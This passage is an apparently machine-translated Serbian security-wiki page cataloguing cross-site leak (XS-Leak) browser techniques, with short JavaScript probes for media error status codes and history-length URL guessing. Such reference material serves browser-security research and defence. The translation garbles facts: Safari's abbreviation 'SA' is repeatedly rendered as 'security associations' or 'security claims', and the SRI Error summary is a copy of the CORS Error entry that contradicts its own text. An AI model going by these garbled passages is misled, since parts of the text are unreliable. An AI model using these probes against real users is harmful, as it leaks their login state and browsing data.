* **Inclusion Methods**: Frames
* **Detectable Difference**: Page Content
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Korišćenjem XSS Auditor-a u Bezbednosnim Asocijacijama, napadači mogu detektovati specifične elemente web stranice posmatrajući promene u odgovorima kada kreirani payload-ovi aktiviraju mehanizam filtriranja auditor-a.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

U Bezbednosnim Asocijacijama (SA), XSS Auditor, prvobitno namenjen sprečavanju napada Cross-Site Scripting (XSS), može paradoksalno biti iskorišćen za curenje osetljivih informacija. Iako je ova ugrađena funkcija uklonjena iz Google Chrome-a (GC), još uvek je prisutna u SA. Godine 2013, Braun i Heiderich su pokazali da XSS Auditor može nenamerno blokirati legitimne skripte, dovodeći do lažnih pozitivnih rezultata. Oslanjajući se na ovo, istraživači su razvili tehnike za ekstrakciju informacija i detekciju specifičnog sadržaja na stranicama sa drugog domena, koncept poznat kao XS-Curenja, prvobitno izveštavan od strane Terade i razrađen od strane Heyesa u blog postu. Iako su ove tehnike bile specifične za XSS Auditor u GC, otkriveno je da u SA, stranice blokirane od strane XSS Auditor-a ne generišu unose u Performance API, otkrivajući metodu putem koje bi osetljive informacije mogle i dalje biti otkrivene.

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** Resurs sa X-Frame-Options zaglavljem ne kreira unos vremena resursa.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Ako stranica **nije dozvoljena** da bude **renderovana** u **iframe-u**, ona ne **kreira unos performansi**. Kao rezultat, napadač može detektovati zaglavlje odgovora **`X-Frame-Options`**.\
Isto se dešava ako koristite **embed** **tag.**

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Preuzimanja ne kreiraju unose vremena resursa u Performance API.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Slično, kao što je opisano u XS-Curenju, **resurs koji se preuzima** zbog zaglavlja ContentDisposition, takođe ne **kreira unos performansi**. Ova tehnika funkcioniše u svim glavnim pregledačima.

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Unos vremena resursa curi vreme početka preusmeravanja.
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Pronašli smo jedan primer XS-Curenja koji zloupotrebljava ponašanje nekih pregledača koji beleže previše informacija za zahteve sa drugih domena. Standard definiše podskup atributa koji bi trebali biti postavljeni na nulu za resurse sa drugih domena. Međutim, u **SA** je moguće detektovati da li je korisnik **preusmeren** od strane ciljne stranice, upitivanjem **Performance API** i proverom za **redirectStart vremenske podatke**.

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirect
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Trajanje unosa vremena je negativno kada dođe do preusmeravanja.
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

U GC, **trajanje** za zahteve koji rezultiraju **preusmeravanjem** je **negativno** i tako se može **razlikovati** od zahteva koji ne rezultiraju preusmeravanjem.

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Resurs zaštićen CORP-om ne kreira unose vremena resursa.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

U nekim slučajevima, **nextHopProtocol unos** može se koristiti kao tehnika curenja. U GC, kada je **CORP zaglavlje** postavljeno, nextHopProtocol će biti **prazan**. Imajte na umu da SA neće uopšte kreirati unos performansi za resurse omogućene CORP-om.

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: API Usage
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** Detektovati da li je servisni radnik registrovan za određeni domen.
* **Code Example**:

Servisni radnici su skriptni konteksti vođeni događajima koji se izvršavaju na jednom domenu. Oni rade u pozadini web stranice i mogu presresti, modifikovati i **keširati resurse** kako bi stvorili offline web aplikaciju.\
Ako je **resurs keširan** od strane **servisnog radnika** pristupljen putem **iframe-a**, resurs će biti **učitan iz keša servisnog radnika**.\
Da bi se detektovalo da li je resurs **učitan iz keša servisnog radnika**, može se koristiti **Performance API**.\
To se takođe može uraditi sa napadom na vreme (proverite rad za više informacija).

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** Moguće je proveriti da li je resurs sačuvan u kešu.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Korišćenjem [Performance API](xs-search.md#performance-api) moguće je proveriti da li je resurs keširan.

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** Moguće je dobiti mrežno trajanje zahteva iz `performance` API.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

* **Inclusion Methods**: HTML Elements (Video, Audio)
* **Detectable Difference**: Status Code
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** U Firefox-u je moguće precizno curenje status koda zahteva sa drugog domena.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
The `MediaError` интерфејс има својство поруке које јединствено идентификује ресурсе који се успешно учитавају са различитим низом. Нападач може искористити ову функцију посматрајући садржај поруке, чиме може закључити статус одговора крос-изворног ресурса.

### CORS Greška

* **Методе укључивања**: Fetch API
* **Уочљива разлика**: Заглавље
* **Више информација**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Резиме:** У Безбедносним Тврђењима (SA), CORS поруке о грешкама ненамерно откривају пуни URL преусмерених захтева.
* **Пример кода**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Ова техника омогућава нападачу да **извуче одредиште преусмеравања крос-изворне локације** искоришћавајући начин на који Webkit-базирани прегледачи обрађују CORS захтеве. Конкретно, када се **CORS-ом омогућен захтев** пошаље на циљну локацију која издаје преусмеравање на основу стања корисника, а прегледач касније одбије захтев, **пуни URL циља преусмеравања** се открива у поруци о грешци. Ова рањивост не само да открива чињеницу о преусмеравању, већ и открива крајњу тачку преусмеравања и све **осетљиве параметре упита** које може садржати.

### SRI Greška

* **Методе укључивања**: Fetch API
* **Уочљива разлика**: Заглавље
* **Више информација**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Резиме:** У Безбедносним Тврђењима (SA), CORS поруке о грешкама ненамерно откривају пуни URL преусмерених захтева.
* **Пример кода**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Нападач може искористити **опширне поруке о грешкама** да закључи величину крос-изворних одговора. Ово је могуће због механизма Интегритета Подресурса (SRI), који користи атрибут интегритета да потврди да ресурси преузети, често из CDN-ова, нису модификовани. Да би SRI радио на крос-изворним ресурсима, они морају бити **CORS-ом омогућени**; у противном, нису подложни проверама интегритета. У Безбедносним Тврђењима (SA), слично као CORS грешка XS-Leak, порука о грешци може бити ухваћена након што захтев за преузимање са атрибутом интегритета не успе. Нападачи могу намерно **изазвати ову грешку** додељујући **лажну хеш вредност** атрибуту интегритета било ког захтева. У SA, резултујућа порука о грешци ненамерно открива дужину садржаја захтеваног ресурса. Ово curenje информација омогућава нападачу да разликује варијације у величини одговора, отварајући пут за сложене XS-Leak нападе.

### CSP Повреда/Детекција

* **Методе укључивања**: Поп-уп прозори
* **Уочљива разлика**: Код статуса
* **Више информација**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Резиме:** Дозвољавајући само веб локацију жртве у CSP-у, ако покуша да преусмери на другу домену, CSP ће активирати уочљиву грешку.
* **Пример кода**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak може користити CSP да детектује да ли је крос-изворна локација преусмерена на другу локацију. Овај leak може детектовати преусмеравање, али поред тога, домен циља преусмеравања се открива. Основна идеја овог напада је да **дозволи циљни домен на локацији нападача**. Када се изда захтев за циљни домен, он **преусмерава** на крос-изворни домен. **CSP блокира** приступ томе и генерише **извештај о повреди који се користи као техника curenja**. У зависности од прегледача, **овaj извештај може открити циљну локацију преусмеравања**.\
Савремени прегледачи неће указати на URL на који је преусмерено, али и даље можете детектовати да је крос-изворно преусмеравање активирано.

### Keš

* **Методе укључивања**: Фреймови, Поп-уп прозори
* **Уочљива разлика**: Садржај странице
* **Више информација**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Резиме:** Очистите датотеку из кеша. Отвара циљну страницу проверава да ли је датотека присутна у кешу.
* **Пример кода:**

Прегледачи могу користити један zajednički кеш за све веб локације. Без обзира на њихов извор, могуће је закључити да ли је циљна страница **захтевала одређену датотеку**.

Ако страница учита слику само ако је корисник пријављен, можете **неважећи** **ресурс** (тако да више није кеширан ако је био, погледајте више информација), **извршити захтев** који би могао учитати тај ресурс и покушати да учита ресурс **са лошим захтевом** (нпр. користећи прекомерно дуг заглавље реферера). Ако учитавање ресурса **није активирало ниједну грешку**, то је зато што је **кеширан**.

### CSP Директива

* **Методе укључивања**: Фреймови
* **Уочљива разлика**: Заглавље
* **Више информација**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Резиме:** CSP заглавље директиве могу се испитати користећи CSP iframe атрибут, откривајући детаље политике.
* **Пример кода**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Нова функција у Google Chrome (GC) омогућава веб страницама да **предложе Политику Безбедности Садржаја (CSP)** постављањем атрибута на iframe елемент, са директивама политике које се преносе заједно са HTTP захтевом. Обично, уграђени садржај мора **да овласти ово преко HTTP заглавља**, или се **приказује страница о грешци**. Међутим, ако је iframe већ под контролом CSP-а и ново предложена политика није строжа, страница ће се учитати нормално. Овај механизам отвара пут за нападача да **открије специфичне CSP директиве** крос-изворне странице идентификовањем странице о грешци. Иако је ова рањивост обележена као исправљена, наша открића откривају **нову технику curenja** способну да детектује страницу о грешци, што сугерише да проблем није никада у потпуности решен.

### **CORP**

* **Методе укључивања**: Fetch API
* **Уочљива разлика**: Заглавље
* **Више информација**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Резиме:** Ресурси заштићени Политиком Ресурса Крос-Извора (CORP) ће изазвати грешку када се преузму из недозвољеног извора.
* **Пример кода**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP заглавље је релативно нова функција безбедности веб платформе која, када је постављена, **блокира no-cors крос-изворне захтеве за дати ресурс**. Присуство заглавља може се детектовати, јер ресурс заштићен CORP **изазива грешку када се преузме**.

### CORB

* **Методе укључивања**: HTML Елементи
* **Уочљива разлика**: Заглавља
* **Више информација**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Резиме**: CORB може дозволити нападачима да детектују када је **`nosniff` заглавље присутно** у захтеву.
* **Пример кода**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Проверите линк за више информација о нападу.

### CORS грешка на конфигурацији одраза порекла <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Методе укључивања**: Fetch API
* **Уочљива разлика**: Заглавља
* **Више информација**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Резиме**: Ако се заглавље Origin одражава у заглављу `Access-Control-Allow-Origin`, могуће је проверити да ли је ресурс већ у кешу.
* **Пример кода**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

У случају да се **Origin заглавље** одражава у заглављу `Access-Control-Allow-Origin`, нападач може злоупотребити ово понашање да покуша да **преузме** **ресурс** у **CORS** режиму. Ако **грешка** **није** активирана, то значи да је **исправно преузета са веба**, ако је грешка **активирана**, то је зато што је **приступљена из кеша** (грешка се појављује јер кеш чува одговор са CORS заглављем које дозвољава оригиналну домену, а не домену нападача)**.**\
Имајте на уму да ако порекло није одражено, али се користи дики (`Access-Control-Allow-Origin: *`), ово неће функционисати.

## Техника читљивих атрибута

### Fetch преусмеравање

* **Методе укључивања**: Fetch API
* **Уочљива разлика**: Код статуса
* **Више информација**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Резиме:** GC и SA омогућавају проверу типа одговора (opaque-redirect) након што је преусмеравање завршено.
* **Пример кода**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Подношењем захтева користећи Fetch API са `redirect: "manual"` и другим параметрима, могуће је прочитати атрибут `response.type` и ако је једнак `opaqueredirect`, онда је одговор био преусмеравање.

### COOP

* **Методе укључивања**: Поп-уп прозори
* **Уочљива разлика**: Заглавље
* **Више информација**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Резиме:** Странице заштићене Политиком Отварача Крос-Извора (COOP) спречавају приступ из крос-изворних интеракција.
* **Пример кода**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Нападач може закључити присуство заглавља Политике Отварача Крос-Извора (COOP) у крос-изворном HTTP одговору. COOP се користи од стране веб апликација да спречи спољне локације да добију произвољне референце на прозоре. Видљивост овог заглавља може се утврдити покушавањем да се приступи **`contentWindow` референци**. У сценаријима где се COOP примењује условно, **`opener` својство** постаје индикатор: оно је **неодређено** када је COOP активан, а **одређено** у његовом одсуству.

### Максимална дужина URL - серверска страна

* **Методе укључивања**: Fetch API, HTML Елементи
* **Уочљива разлика**: Код статуса / Садржај
* **Више информација**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Резиме:** Детектујте разлике у одговорима јер дужина одговора преусмеравања може бити превелика да сервер одговори грешком и генерише упозорење.
* **Пример кода**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Ако серверско преусмеравање користи **кориснички унос у преусмеравању** и **додатне податке**. Могуће је детектовати ово понашање јер обично **сервери** имају **ограничење дужине захтева**. Ако су **кориснички подаци** те **дужине - 1**, јер **преусмеравање** користи **те податке** и **додаје** нешто **додатно**, изазваће **грешку која се може детектовати преко догађаја о грешкама**.

Ако можете на неки начин поставити колачиће кориснику, можете такође извршити овај напад постављајући **довољно колачића** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) тако да са **увећаном величином одговора** **исправног одговора** буде **изазвана грешка**. У овом случају, запамтите да ако активирате овај захтев са исте локације, `<script>` ће аутоматски послати колачиће (тако да можете проверити грешке).\
Пример **cookie bomb + XS-Search** може се наћи у Намераној решењу овог извештаја: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` или да буде у истом контексту обично је потребно за ову врсту напада.

### Максимална дужина URL - клијентска страна

* **Методе укључивања**: Поп-уп прозори
* **Уочљива разлика**: Код статуса / Садржај
* **Више информација**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Резиме:** Детектујте разлике у одговорима јер дужина одговора преусмеравања може бити превелика за захтев да се примети разлика.
* **Пример кода**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Према [Chromium документацији](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), максимална дужина URL-а у Chrome-у је 2MB.

> Уопштено, _веб платформа_ нема ограничења на дужину URL-ова (иако је 2^31 уобичајено ограничење). _Chrome_ ограничава URL-ове на максималну дужину од **2MB** из практичних разлога и да избегне проблеме са одбијањем услуге у међупроцесној комуникацији.

Стога, ако је **URL преусмеравања већи у једном од случајева**, могуће је учинити да се преусмери са **URL-ом већим од 2MB** да би се достигло **ограничење дужине**. Када се то догоди, Chrome приказује страницу **`about:blank#blocked`**.

**Уочљива разлика** је да ако је **преусмеравање** било **завршено**, `window.origin` избацује **грешку** јер крос-извор не може да приступи тим информацијама. Међутим, ако је **ограничење** било \*\*\*\* достигнуто и учитана страница је **`about:blank#blocked`**, **`origin`** прозора остаје онај од **родитеља**, што је **приступачна информација.**

Све додатне информације потребне за достићи **2MB** могу се додати преко **хаша** у иницијалном URL-у тако да ће бити **коришћене у преусмеравању**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### Максимални преусмеравања

* **Методе укључивања**: Fetch API, Фреймови
* **Уочљива разлика**: Код статуса
* **Више информација**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Резиме:** Искористите ограничење преусмеравања прегледача да утврдите да ли је дошло до преусмеравања URL-а.
* **Пример кода**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Ако је **максимални** број **преусмеравања** које прегледач може да прати **20**, нападач би могао покушати да учита своју страницу са **19 преусмеравања** и на крају **пошаље жртву** на тестирану страницу. Ако се **грешка** активира, онда је страница покушавала да **преусмери жртву**.

### Дужина историје

* **Методе укључивања**: Фреймови, Поп-уп прозори
* **Уочљива разлика**: Преусмеравања
* **Више информација**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Резиме:** JavaScript код манипулише историјом прегледача и може се приступити својству дужине.
* **Пример кода**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**History API** омогућава JavaScript коду да манипулише историјом прегледача, која **чува странице које је корисник посетио**. Нападач може користити својство дужине као метод укључивања: да детектује JavaScript и HTML навигацију.\
**Проверавајући `history.length`**, терајући корисника да **наведе** на страницу, **враћајући** се **назад** на исто порекло и **проверавајући** нову вредност **`history.length`**.

### Дужина историје са истим URL-ом

* **Методе укључивања**: Фреймови, Поп-уп прозори
* **Уочљива разлика**: Ако је URL исти као онaj који је погодан
* **Резиме:** Могуће је погодити да ли се локација фрејма/поп-упа налази на одређеном URL-у злоупотребом дужине историје.
* **Пример кода**: Испод

Нападач би могао користити JavaScript код да **манипулише локацијом фрејма/поп-упа на погодан URL** и **одмах** **промени на `about:blank`**. Ако се дужина историје повећала, то значи да је URL био тачан и да је имао времена да **порасте јер се URL не учитава поново ако је исти**. Ако се није повећала, то значи да је **покушао да учита погодан URL**, али зато што смо **одмах после** учитали **`about:blank`**, **дужина историје никада није повећана** при учитавању погодног URL-а.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Summary:** Procena količine iframe elemenata inspekcijom `window.length` svojstva.
* **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Brojanje **broja okvira na webu** otvorenog putem `iframe` ili `window.open` može pomoći u identifikaciji **statusa korisnika na toj stranici**.\
Štaviše, ako stranica uvek ima isti broj okvira, kontinuirano proveravanje broja okvira može pomoći u identifikaciji **obraza** koji može otkriti informacije.

Primer ove tehnike je da se u chrome-u, **PDF** može **otkriti** pomoću **brojanja okvira** jer se `embed` koristi interno. Postoje [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) koji omogućavaju određenu kontrolu nad sadržajem kao što su `zoom`, `view`, `page`, `toolbar` gde bi ova tehnika mogla biti zanimljiva.

### HTMLElements

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Summary:** Pročitajte otkrivenu vrednost da biste razlikovali između 2 moguća stanja
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Curjenje informacija kroz HTML elemente je zabrinjavajuće u web bezbednosti, posebno kada se dinamički medijski fajlovi generišu na osnovu korisničkih informacija, ili kada se dodaju vodeni žigovi, menjajući veličinu medija. Ovo mogu iskoristiti napadači da razlikuju između mogućih stanja analizirajući informacije koje izlažu određeni HTML elementi.

### Information Exposed by HTML Elements

* **HTMLMediaElement**: Ovaj element otkriva `duration` i `buffered` vreme medija, koja se mogu pristupiti putem njegovog API-ja. [Pročitajte više o HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Otkriva `videoHeight` i `videoWidth`. U nekim pregledačima, dodatna svojstva kao što su `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, i `webkitDecodedFrameCount` su dostupna, nudeći dublje informacije o sadržaju medija. [Pročitajte više o HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Ova funkcija pruža detalje o kvalitetu reprodukcije videa, uključujući `totalVideoFrames`, što može ukazivati na količinu obrađenih video podataka. [Pročitajte više o getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Ovaj element otkriva `height` i `width` slike. Međutim, ako je slika nevažeća, ova svojstva će vratiti 0, a funkcija `image.decode()` će biti odbijena, što ukazuje na neuspeh učitavanja slike ispravno. [Pročitajte više o HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Summary:** Identifikujte varijacije u stilizovanju web stranice koje se koreliraju sa stanjem ili statusom korisnika.
* **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web aplikacije mogu menjati **stilizovanje web stranice u zavisnosti od statusa korisnika**. CSS fajlovi sa različitih domena mogu biti ugrađeni na stranici napadača pomoću **HTML link elementa**, a **pravila** će biti **primenjena** na stranicu napadača. Ako stranica dinamički menja ova pravila, napadač može **otkriti** ove **razlike** u zavisnosti od stanja korisnika.\
Kao tehnika curenja, napadač može koristiti `window.getComputedStyle` metodu da **pročita CSS** svojstva određenog HTML elementa. Kao rezultat, napadač može čitati proizvoljna CSS svojstva ako su poznati pogođeni element i naziv svojstva.

### CSS History

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Summary:** Otkrivanje da li je stil `:visited` primenjen na URL koji ukazuje da je već posetjen
* **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Prema [**ovome**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), ovo ne funkcioniše u headless Chrome-u.
{% endhint %}

CSS `:visited` selektor se koristi za stilizovanje URL-ova drugačije ako su prethodno posetili korisnik. U prošlosti, `getComputedStyle()` metoda se mogla koristiti za identifikaciju ovih razlika u stilu. Međutim, moderni pregledači su implementirali bezbednosne mere kako bi sprečili ovu metodu da otkrije stanje linka. Ove mere uključuju uvek vraćanje izračunatog stila kao da je link posetjen i ograničavanje stilova koji se mogu primeniti sa `:visited` selektorom.

